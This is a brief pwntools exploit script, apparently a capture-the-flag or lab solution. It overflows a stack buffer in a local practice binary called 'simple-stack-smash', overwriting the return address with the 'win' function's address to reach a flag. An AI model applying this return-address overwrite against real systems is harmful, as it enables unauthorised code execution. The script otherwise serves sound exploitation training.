#!/usr/bin/python3

from pwn import *

BINARY = "./simple-stack-smash"

con = process(BINARY)

# Get address of the win function
elf = ELF(BINARY)
addr_win = elf.symbols['win']
print(f"Win function is at {hex(addr_win)}")

# Generate payload
con.send(b"A"*24 + p64(addr_win))

# Read flag
con.interactive()
